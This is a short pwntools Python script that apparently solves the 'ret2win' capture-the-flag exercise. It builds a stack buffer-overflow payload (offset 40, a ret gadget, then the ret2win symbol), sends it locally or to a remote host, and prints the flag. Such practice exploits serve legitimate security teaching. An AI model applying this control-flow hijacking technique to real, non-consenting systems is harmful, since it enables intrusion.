#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2win')

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def ret2win():
    offset = 40
    ret = 0x000000000040053e # ret; 

    payload = flat({
        offset: [
            ret,
            exe.sym['ret2win']
        ]
    })

    io.sendline(payload)
    io.recvuntil('flag:')
    io.recvline()
    flag = io.recv(1024).decode()
    info(f"Flag: {flag}")

    io.close()

def main():
    
    init()
    ret2win()

if __name__ == '__main__':
    main()

